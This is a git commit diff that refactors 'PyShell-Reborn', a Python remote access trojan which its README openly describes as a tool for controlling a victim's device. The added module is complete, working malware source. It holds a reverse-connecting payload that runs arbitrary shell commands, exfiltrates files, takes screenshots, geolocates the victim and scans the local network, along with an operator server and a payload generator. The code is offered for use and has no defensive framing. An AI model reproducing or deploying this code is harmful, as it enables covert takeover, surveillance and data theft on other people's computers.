e7b4abf75de776494e156dfdbcac0891803829c6
arnavpadwal <arnav.padwal7@gmail.com>
2024-07-17 23:12:11 +0530

    refactored code beta

--- README.md
+++ README.md
@@ -1,43 +1,46 @@
-# PyShell Tool 
-   <h4>Remote Access Trojan - RAT</h4>
+# PyShell-Reborn
 
-# Screen Shot
+NOTE: PyShell-Reborn is a python3 implementation of the [pyshell](https://github.com/knassar702/pyshell) tool by knassar702.
 
-https://user-images.githubusercontent.com/45688522/154745539-c2e646bd-c547-4f21-9faf-d00f6b01137e.mp4
-
-# Tool Features 
-<ul>
-   <li>Upload And Download Files</li>
-   <li>Execute os Command</li>
-   <li>Get Victim Address</li>
-   <li>openfile in victim device</li>
-   <li>open url in Victim Browser</li>
-   <li>print message in Victim terminal</li>
-   <li>see who is up on the victim network</li>
-   <li>Take screenshot from victim device</li>
-</ul>
+**PyShell-Reborn** is a Remote Access Trojan (RAT) that allows for comprehensive control over a victim's device.
 
 
-# install Pyshell (Linux)
-````bash
-$ git clone https://github.com/khalednassar702/Pyshell
-$ cd Pyshell
-$ ./Pyshell
-````
+## Features 
 
-### Payload Requirements
-<ul>
-   <li>Pyscreenshot</li>
-   <li>Requests</li>
-   <li>Nmap</li>
-</ul>
+- Upload and download files.
+- Execute OS commands.
+- Get victim's address.
+- Open files on the victim's device.
+- Open URLs in the victim's browser.
+- Print messages in the victim's terminal.
+- See active devices on the victim's network.
+- Take screenshots from the victim's device.
 
-# install Payload Requirements
-````bash
-$ sudo pip2 install pyscreenshot
-$ sudo pip2 install python-nmap
-$ sudo pip2 install requests
-````
+
+## Installation (Linux)
+
+1. Clone the repository locally: 
+
+``` shell
+git clone https://github.com/arnavpadwal/pyshell-reborn.git
+cd pyshell-reborn
+```
+
+2. Install Dependencies:
+
+``` shell
+pip install -r requirements.txt
+```
+
+3. Running the script:
+
+``` shell
+./pyshell-reborn
+```
+
+## To-Do
+
+- [ ] Windows support.
 
 
 
---
+++ modules/pyshell-reborn.py
@@ -0,0 +1,332 @@
+"""
+This project is a fork of https://github.com/knassar702/pyshell
+Coded by: Arnav Padwal https://github.com/arnavpadwal
+License: GPL 3.0
+"""
+
+import os
+import sys
+import socket
+import random
+import subprocess
+from time import sleep
+
+
+class Utils:
+    @staticmethod
+    def slow_print(text, speed):
+        speeds = {1: 0.05, 2: 0.0125, 3: 0.00833}
+        delay = speeds.get(speed, 0)
+        for char in text + '\n':
+            sys.stdout.write(char)
+            sys.stdout.flush()
+            sleep(delay)
+
+    @staticmethod
+    def restart():
+        python = sys.executable
+        os.execl(python, python, *sys.argv)
+
+
+class Payload:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.modules_loaded = True
+        self.s = None
+        self.l = random.randint(1, 100000)
+        self.setup()
+
+    def setup(self):
+        try:
+            import nmap3
+            import pyscreenshot
+            import requests
+        except ImportError:
+            self.modules_loaded = False
+            self.send_error("Your Victim needs these modules: requests, python3-nmap, pyscreenshot.")
+        if self.modules_loaded:
+            self.nm = nmap3.NmapScanTechniques()
+            self.connect()
+
+    def connect(self):
+        try:
+            self.s = socket.socket()
+            self.s.connect((self.host, self.port))
+            self.s.sendall(b"Connected successfully")
+        except:
+            Utils.restart()
+
+    def nmap_scan(self, ip):
+        try:
+            scan_data = self.nm.nmap_ping_scan(ip)
+            for host in scan_data.keys():
+                if scan_data[host].get('state') == 'up':
+                    self.s.sendall(host.encode())
+            self.s.sendall(b"stop")
+        except Exception as e:
+            self.send_error(str(e))
+
+    def handle_commands(self):
+        while True:
+            cmd = self.s.recv(1024).decode().strip()
+            if cmd.startswith('cd '):
+                try:
+                    os.chdir(cmd[3:])
+                    self.s.sendall(b"Directory changed")
+                except FileNotFoundError:
+                    self.send_error("File Not Found")
+            elif cmd == 'download':
+                self.s.sendall(b"name")
+                file_name = self.s.recv(1024).decode().strip()
+                self.download_file(file_name)
+            elif cmd == 'upload':
+                self.upload_file()
+            elif cmd == 'screenshot':
+                self.take_screenshot()
+            elif cmd == 'address':
+                self.send_address()
+            elif cmd == 're()':
+                self.restart()
+            elif cmd.startswith('netscan'):
+                ip = cmd.split()[-1]
+                self.nmap_scan(ip + '/24')
+            else:
+                self.execute_command(cmd)
+
+    def download_file(self, file_name):
+        try:
+            with open(file_name, 'rb') as file:
+                while chunk := file.read(1024):
+                    self.s.sendall(chunk)
+            self.s.sendall(b"[+] Done")
+        except FileNotFoundError:
+            self.send_error("[-] ERROR")
+
+    def upload_file(self):
+        self.s.sendall(b"ok")
+        file_name = f"{self.l}.pyshell"
+        with open(file_name, 'wb') as file:
+            while True:
+                data = self.s.recv(1024)
+                if not data:
+                    break
+                file.write(data)
+        self.s.sendall(b"[+] Done")
+
+    def take_screenshot(self):
+        try:
+            import pyscreenshot as ImageGrab
+            screenshot = ImageGrab.grab()
+            file_name = f"{self.l}.png"
+            screenshot.save(file_name)
+            self.s.sendall(f"Taked: {file_name}".encode())
+        except Exception as e:
+            self.send_error(str(e))
+
+    def send_address(self):
+        try:
+            import requests
+            res = requests.get('https://ipinfo.io/')
+            data = res.json()
+            address_info = f"""
+            IP: {data['ip']}
+            City: {data['city']}
+            Latitude: {data['loc'].split(',')[0]}
+            Longitude: {data['loc'].split(',')[1]}
+            """
+            self.s.sendall(address_info.encode())
+        except Exception as e:
+            self.send_error(str(e))
+
+    def execute_command(self, cmd):
+        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        self.s.sendall(result.stdout + result.stderr)
+
+    def send_error(self, message):
+        self.s.sendall(f"[!] {message}".encode())
+
+    def restart(self):
+        self.s.close()
+        sleep(1.5)
+        Utils.restart()
+
+
+class Server:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.client_socket = None
+
+    def start(self):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+            server_socket.bind((self.host, self.port))
+            server_socket.listen(1)
+            print("[+] Waiting for the victim...")
+            self.client_socket, _ = server_socket.accept()
+            print("[+] Connected!")
+            self.handle_client()
+
+    def handle_client(self):
+        while True:
+            command = input(">>>> ").strip()
+            if command in ["exit", "quit"]:
+                break
+            self.client_socket.sendall(command.encode())
+            response = self.client_socket.recv(1024).decode()
+            print(response)
+
+    def send_command(self, command):
+        self.client_socket.sendall(command.encode())
+        response = self.client_socket.recv(1024).decode()
+        print(response)
+
+
+def make_payload(host, port, path):
+    payload_code = f"""
+#!/usr/bin/env python3
+import socket
+import subprocess
+import os
+import sys
+import random
+from time import sleep
+
+class Payload:
+    def __init__(self, host, port):
+        self.host = host
+        self.port = port
+        self.modules_loaded = True
+        self.s = None
+        self.l = random.randint(1, 100000)
+        self.setup()
+
+    def setup(self):
+        try:
+            import nmap3
+            import pyscreenshot
+            import requests
+        except ImportError:
+            self.modules_loaded = False
+            self.send_error("Your Victim needs these modules: requests, python3-nmap, pyscreenshot.")
+        if self.modules_loaded:
+            self.nm = nmap3.NmapScanTechniques()
+            self.connect()
+
+    def connect(self):
+        try:
+            self.s = socket.socket()
+            self.s.connect((self.host, self.port))
+            self.s.sendall(b"Connected successfully")
+        except:
+            self.restart()
+
+    def nmap_scan(self, ip):
+        try:
+            scan_data = self.nm.nmap_ping_scan(ip)
+            for host in scan_data.keys():
+                if scan_data[host].get('state') == 'up':
+                    self.s.sendall(host.encode())
+            self.s.sendall(b"stop")
+        except Exception as e:
+            self.send_error(str(e))
+
+    def handle_commands(self):
+        while True:
+            cmd = self.s.recv(1024).decode().strip()
+            if cmd.startswith('cd '):
+                try:
+                    os.chdir(cmd[3:])
+                    self.s.sendall(b"Directory changed")
+                except FileNotFoundError:
+                    self.send_error("File Not Found")
+            elif cmd == 'download':
+                self.s.sendall(b"name")
+                file_name = self.s.recv(1024).decode().strip()
+                self.download_file(file_name)
+            elif cmd == 'upload':
+                self.upload_file()
+            elif cmd == 'screenshot':
+                self.take_screenshot()
+            elif cmd == 'address':
+                self.send_address()
+            elif cmd == 're()':
+                self.restart()
+            elif cmd.startswith('netscan'):
+                ip = cmd.split()[-1]
+                self.nmap_scan(ip + '/24')
+            else:
+                self.execute_command(cmd)
+
+    def download_file(self, file_name):
+        try:
+            with open(file_name, 'rb') as file:
+                while chunk := file.read(1024):
+                    self.s.sendall(chunk)
+            self.s.sendall(b"[+] Done")
+        except FileNotFoundError:
+            self.send_error("[-] ERROR")
+
+    def upload_file(self):
+        self.s.sendall(b"ok")
+        file_name = f"{self.l}.pyshell"
+        with open(file_name, 'wb') as file:
+            while True:
+                data = self.s.recv(1024)
+                if not data:
+                    break
+                file.write(data)
+        self.s.sendall(b"[+] Done")
+
+    def take_screenshot(self):
+        try:
+            import pyscreenshot as ImageGrab
+            screenshot = ImageGrab.grab()
+            file_name = f"{self.l}.png"
+            screenshot.save(file_name)
+            self.s.sendall(f"Taked: {file_name}".encode())
+        except Exception as e:
+            self.send_error(str(e))
+
+    def send_address(self):
+        try:
+            import requests
+            res = requests.get('https://ipinfo.io/')
+            data = res.json()
+            address_info = f"IP: {data['ip']}\nCity: {data['city']}\nLatitude: {data['loc'].split(',')[0]}\nLongitude: {data['loc'].split(',')[1]}"
+            self.s.sendall(address_info.encode())
+        except Exception as e:
+            self.send_error(str(e))
+
+    def execute_command(self, cmd):
+        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        self.s.sendall(result.stdout + result.stderr)
+
+    def send_error(self, message):
+        self.s.sendall(f"[!] {message}".encode())
+
+    def restart(self):
+        self.s.close()
+        sleep(1.5)
+        self.__init__(self.host, self.port)
+
+
+if __name__ == "__main__":
+    p = Payload('{host}', {port})
+    p.handle_commands()
+"""
+    with open(path, 'w') as f:
+        f.write(payload_code)
+
+
+def main():
+    host = input("Enter the host: ")
+    port = int(input("Enter the port: "))
+    payload_path = input("Enter the payload path: ")
+    make_payload(host, port, payload_path)
+    server = Server(host, port)
+    server.start()
+
+
+if __name__ == "__main__":
+    main()
